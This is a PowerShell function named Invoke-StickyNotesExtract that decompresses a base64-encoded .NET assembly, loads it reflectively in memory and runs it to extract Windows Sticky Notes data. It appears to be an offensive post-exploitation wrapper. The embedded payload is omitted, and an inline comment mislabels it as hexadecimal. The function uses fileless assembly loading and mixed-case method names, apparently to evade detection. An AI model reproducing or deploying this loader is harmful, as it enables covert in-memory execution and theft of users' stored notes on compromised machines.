function Invoke-StickyNotesExtract
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIAA...JAA==")) # The omitted "H4sIAA...JAA==" is actually a 8350288 character long hexadecimal string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [StickyNotesExtract.Program]::Main($Command.Split(" "))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
